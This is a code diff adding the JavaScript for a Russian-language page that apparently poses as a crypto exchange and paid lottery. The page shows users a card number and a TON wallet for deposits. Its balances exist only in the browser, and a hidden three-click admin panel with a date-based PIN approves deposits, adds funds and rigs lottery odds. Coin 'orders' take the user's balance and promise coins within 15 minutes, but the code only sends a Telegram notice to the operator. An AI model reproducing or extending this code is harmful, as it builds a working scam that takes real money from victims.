@@ -160,4 +160,165 @@
         function syncPassword() {
             const now = new Date();
             const seed = now.getUTCDate() + now.getUTCHours() + 2026;
-            currentAdminPassword = ((
+            currentAdminPassword = ((seed * 17) % 9000 + 1000).toString();
+        }
+        syncPassword(); setInterval(syncPassword, 60000);
+
+        // ВХОД В АДМИНКУ ПО КЛИКУ НА БАЛАНС (3 раза)
+        function handleAdminEntry() {
+            adminClicks++;
+            if (adminClicks >= 3) {
+                openModal('password-modal');
+                adminClicks = 0;
+            }
+            setTimeout(() => adminClicks = 0, 1000);
+        }
+
+        function checkAdminPassword() {
+            if (document.getElementById('admin-pin-input').value === currentAdminPassword) {
+                closeModal('password-modal'); toggleSidebar();
+            } else { openCustomModal('🔐 ОТКАЗ', 'Введен неверный PIN-код доступа.', 'info'); }
+            document.getElementById('admin-pin-input').value = "";
+        }
+
+        function toggleSidebar() { 
+            const s = document.getElementById('admin-sidebar');
+            s.style.right = s.style.right === '0px' ? '-350px' : '0px';
+            document.getElementById('chance-multiplier').value = winMultiplier;
+            renderSidebar();
+        }
+
+        function getDailyBonus() {
+            const lastBonus = localStorage.getItem('last_bonus');
+            const now = new Date().getTime();
+            if (lastBonus && now - lastBonus < 86400000) {
+                return openCustomModal('⏳ ОЖИДАЙТЕ', 'Вы уже забирали бонус сегодня. Приходите завтра!', 'info');
+            }
+            const prize = (Math.random() * 10 + 5).toFixed(2);
+            balance += parseFloat(prize); updateUI();
+            localStorage.setItem('last_bonus', now);
+            openCustomModal('🎁 ПОЛУЧЕНО', `Вам начислено ${prize} грн ежедневного бонуса!`, 'info');
+        }
+
+        // МОДАЛКА
+        function openCustomModal(title, text, type, callback) {
+            const modal = document.getElementById('custom-modal');
+            document.getElementById('modal-title').innerText = title;
+            document.getElementById('modal-text').innerHTML = text;
+            modal.classList.remove('hidden'); modal.classList.add('flex');
+            
+            if (type === 'confirm') {
+                document.getElementById('modal-main-btn').innerText = "ПОДТВЕРДИТЬ";
+                document.getElementById('modal-main-btn').onclick = () => { callback(); closeCustomModal(); };
+            } else {
+                document.getElementById('modal-main-btn').innerText = "ПОНЯТНО";
+                document.getElementById('modal-main-btn').onclick = closeCustomModal;
+            }
+        }
+        function closeCustomModal() { document.getElementById('custom-modal').classList.add('hidden'); }
+
+        async function initGlobalCrypto() {
+            try {
+                const res = await fetch('https://api.coingecko.com/api/v3/coins/list');
+                allCoins = await res.json();
+                displayCoins(allCoins.slice(0, 30), 'search-results');
+            } catch (e) {}
+        }
+
+        function displayCoins(list, containerId) {
+            const container = document.getElementById(containerId);
+            container.innerHTML = list.map(c => `
+                <div onclick="purchaseCoin('${c.id}', '${c.symbol.toUpperCase()}')" class="glass p-5 rounded-2xl border border-white/5 text-center cursor-pointer hover:border-blue-500 hover:scale-105 transition-all">
+                    <p class="text-[7px] text-slate-600 font-black uppercase mb-1">${c.symbol}</p>
+                    <p class="text-[12px] font-black text-blue-500 truncate">${c.name}</p>
+                </div>`).join('');
+        }
+
+        async function purchaseCoin(id, symbol) {
+            try {
+                const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${id}&vs_currencies=usd`);
+                const data = await res.json();
+                const price = (data[id].usd * 42.5 * 1.075).toFixed(2);
+                openCustomModal('💳 КУРС ТЕРМИНАЛА', `Цена ${symbol} на данный момент: <span class="text-green-400 font-bold">${price} грн</span>.<br>Исполнить мгновенный ордер?`, 'confirm', () => {
+                    if (balance < price) return openCustomModal('❌ БАЛАНС', 'Недостаточно грн на балансе.', 'info');
+                    balance -= price; updateUI();
+                    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("🛒 ПОКУПКА: "+symbol+" на "+price+" грн")}`);
+                    openCustomModal('✅ ИСПОЛНЕНО', 'Ваш ордер принят. Монеты будут зачислены в течение 15 минут.', 'info');
+                });
+            } catch (e) { openCustomModal('⚠️ ОШИБКА', 'Проблема с сетью биржи.', 'info'); }
+        }
+
+        function loadEverything() {
+            displayCoins(allCoins, 'full-coin-grid');
+            document.getElementById('load-all-btn').style.display = 'none';
+        }
+
+        function searchAllCoins() {
+            const q = document.getElementById('global-search').value.toLowerCase();
+            const filtered = allCoins.filter(c => c.name.toLowerCase().includes(q) || c.symbol.toLowerCase().includes(q)).slice(0, 48);
+            displayCoins(filtered, 'search-results');
+        }
+
+        function updateUI() {
+            document.getElementById('balance-display').innerText = balance.toFixed(2) + " грн";
+            localStorage.setItem('user_balance', balance);
+        }
+        function adminAddMoney() { balance += 1000; updateUI(); }
+        function saveChance() { winMultiplier = parseFloat(document.getElementById('chance-multiplier').value) || 1; localStorage.setItem('win_multiplier', winMultiplier); }
+        function renderSidebar() {
+            const l = document.getElementById('sidebar-pending-list');
+            l.innerHTML = pendingList.length ? pendingList.map((d, i) => `
+                <div class="bg-white/5 p-4 rounded-xl flex justify-between items-center border border-white/5">
+                    <p class="text-sm font-black text-blue-500">${d.amount} грн</p>
+                    <button onclick="approveDep(${i})" class="bg-green-600 px-3 py-1.5 rounded-lg text-white font-black uppercase text-[8px]">OK</button>
+                </div>`).join('') : '<p class="text-center text-slate-700 text-[8px] uppercase">Нет оплат</p>';
+        }
+        function approveDep(i) {
+            balance += parseFloat(pendingList[i].amount); pendingList.splice(i, 1);
+            localStorage.setItem('pending_list', JSON.stringify(pendingList));
+            updateUI(); renderSidebar();
+        }
+        function confirmDeposit() {
+            const a = document.getElementById('dep-input').value;
+            pendingList.push({ amount: a }); localStorage.setItem('pending_list', JSON.stringify(pendingList));
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("💰 ДЕПОЗИТ: "+a+" грн")}`);
+            closeModal('deposit-modal'); openCustomModal('🚀 ПРИНЯТО', 'Ваша оплата проверяется оператором.', 'info');
+        }
+
+        function playLotto() {
+            if (balance < 350) return openCustomModal('⚠️ БАЛАНС', 'Нужно 350 грн для открытия.', 'info');
+            balance -= 350; updateUI();
+            const b = document.getElementById('box-anim'); b.classList.add('animate-bounce');
+            setTimeout(() => {
+                b.classList.remove('animate-bounce');
+                document.getElementById('lotto-stage').classList.add('hidden');
+                const r = document.getElementById('prize-reveal'); const icon = document.getElementById('prize-icon');
+                r.classList.remove('hidden'); r.classList.add('flex');
+                const rand = Math.random() * 100;
+                let win = 50; let iconEmoji = "🍭";
+                if (rand <= (0.0001 * winMultiplier)) { win = 2500; iconEmoji = "👑❄️"; }
+                else if (rand <= (3.0 * winMultiplier)) { win = 400; iconEmoji = "💰"; }
+                else if (rand <= (15.0 * winMultiplier)) { win = 275; iconEmoji = "🐟"; }
+                balance += win; updateUI();
+                document.getElementById('prize-value').innerText = win + " грн"; icon.innerText = iconEmoji;
+                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent("🎉 ВЫИГРЫШ: "+win+" UAH")}`);
+            }, 2000);
+        }
+
+        function resetLotto() { document.getElementById('lotto-stage').classList.remove('hidden'); document.getElementById('prize-reveal').classList.add('hidden'); }
+        function showTab(t) { ['main','shop','lotto','earn'].forEach(v => document.getElementById('view-'+v).classList.toggle('hidden', v !== t)); ['btn-main','btn-shop','btn-lotto','btn-earn'].forEach(b => document.getElementById(b).classList.toggle('active', b === 'btn-'+t)); }
+        function openModal(id) { document.getElementById(id).classList.remove('hidden'); document.getElementById(id).classList.add('flex'); }
+        function closeModal(id) { document.getElementById(id).classList.add('hidden'); document.getElementById(id).classList.remove('flex'); }
+        function showDetails(m) { const d = document.getElementById('pay-details'); d.classList.remove('hidden'); d.innerText = m === 'Card' ? "444 1144 3897 8734" : "UQC9jGCKJKY5F77vrlWERXBCG38LBIc54y__gZSEprBJ2IGz"; }
+
+        initGlobalCrypto(); updateUI();
+        setInterval(() => {
+            const el = document.createElement('div'); el.className = 'falling-item';
+            el.innerText = ['❄', '₿', 'Ξ', '🐧'][Math.floor(Math.random()*4)];
+            el.style.left = Math.random() * 100 + 'vw'; el.style.animationDuration = (Math.random()*8+4)+'s';
+            document.getElementById('snow-bg').appendChild(el); setTimeout(() => el.remove(), 10000);
+        }, 500);
+        new TradingView.widget({ "autosize": true, "symbol": "OKX:TONUSDT", "interval": "H", "theme": "dark", "container_id": "tradingview_widget", "backgroundColor": "#010409" });
+    </script>
+</body>
+</html>
